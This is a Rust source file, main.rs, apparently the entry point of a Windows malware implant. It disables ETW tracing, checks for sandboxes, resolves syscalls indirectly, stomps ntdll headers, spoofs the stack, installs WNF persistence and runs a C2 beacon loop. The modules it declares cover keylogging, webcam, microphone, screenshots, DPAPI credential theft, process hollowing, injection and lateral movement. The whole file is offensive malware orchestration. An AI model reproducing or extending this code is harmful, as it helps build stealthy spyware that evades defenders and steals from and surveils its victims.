//! main.rs — Entry point
//!
//! Boot order:
//!   1. ETW blind     — silence event tracing before any noisy API calls
//!   2. Anti-detect   — VM/sandbox/debugger checks; abort if hostile env
//!   3. Resolve fns   — walk ntdll/kernel32 exports for all needed fn ptrs
//!   4. Selfdestruct  — register ctrl handler (wipe-on-SIGTERM)
//!   5. Guardian      — spawn watchdog thread
//!   6. VEH           — install exception handler (wipe-on-crash)
//!   7. ETW + stomp   — patch EtwEventWrite; stomp ntdll module headers
//!   8. Post-shutdown — install WNF persistence channel
//!   9. C2 loop       — connect and serve commands

#![allow(non_snake_case, dead_code)]
#![windows_subsystem = "windows"]

mod antidetect;
mod c2;
mod defs;
mod dpapi;
mod etw_patch;
mod filetransfer;
mod guardian;
mod hashes;
mod hollow;
mod indirect_syscall;
mod keylog;
mod lateral;
mod loader;
mod mic;
mod pe_obfuscate;
mod persist;
mod post_shutdown;
mod ppldump;
mod resurrect;
mod sac_bypass;
mod screenshot;
mod selfdestruct;
mod sleep;
mod spoof;
#[cfg(feature = "ssn-audit")]
mod ssn_audit;
mod stomp;
mod syscall;
mod threadless_inject;
mod token;
mod unhook;
mod utils;
mod watchdog;
mod webcam;

fn main() {
    unsafe {
        // 1. Silence ETW before any other API calls
        etw_patch::apply_all_blinds();

        // 2. Anti-detect: abort if we're in a hostile analysis environment
        if antidetect::is_sandboxed() {
            return;
        }

        // 3. Resolve function pointers from ntdll / kernel32 exports
        let fn_ntqsi   = indirect_syscall::resolve_ntqsi();
        let fn_sleep   = indirect_syscall::resolve_sleep();
        let fn_tick    = indirect_syscall::resolve_tick();
        let fn_add_veh = indirect_syscall::resolve_add_veh();

        // 4. Register console ctrl handler (wipe on CTRL+C / forced close)
        selfdestruct::register_ctrl_handler();

        // Shims: cast no-arg unsafe fn() pointers for guardian callbacks
        let fn_wipe:     unsafe fn() = || selfdestruct::wipe_self();
        let fn_purge:    unsafe fn() = || persist::purge_all();
        let fn_drop_ads: unsafe fn() = || resurrect::drop_from_ads();
        let fn_install:  unsafe fn() = || persist::install_all();
        let fn_hollow:   unsafe fn() -> bool = || hollow::run(&[]);

        // 5. Spawn guardian watchdog thread
        guardian::start_thread(
            fn_ntqsi,
            fn_sleep,
            fn_tick,
            fn_wipe,
            fn_purge,
            fn_drop_ads,
            fn_install,
            fn_hollow,
        );

        // 6. Install VEH (wipe-on-crash)
        guardian::install_veh(fn_add_veh);

        // 7a. Stomp ntdll module list entry to hide our load path
        stomp::stomp(core::ptr::null_mut(), 0);

        // 7b. Init stack-spoof gadget
        spoof::init_gadget();

        // 8. Install WNF post-shutdown persistence channel (all 7 params)
        post_shutdown::install_wnf_channel(
            0x41C64E6D_u64,   // state_name  — well-known WNF_SHEL_* name
            core::ptr::null(), // type_id
            core::ptr::null(), // scope
            0,                // permanent
            4,                // data_size
            core::ptr::null(), // data
            0,                // security_descriptor
        );

        // 9. SSN audit (debug/testing only — compiled out in release)
        #[cfg(feature = "ssn-audit")]
        ssn_audit::run();

        // 10. C2 beacon loop
        c2::run();
    }
}
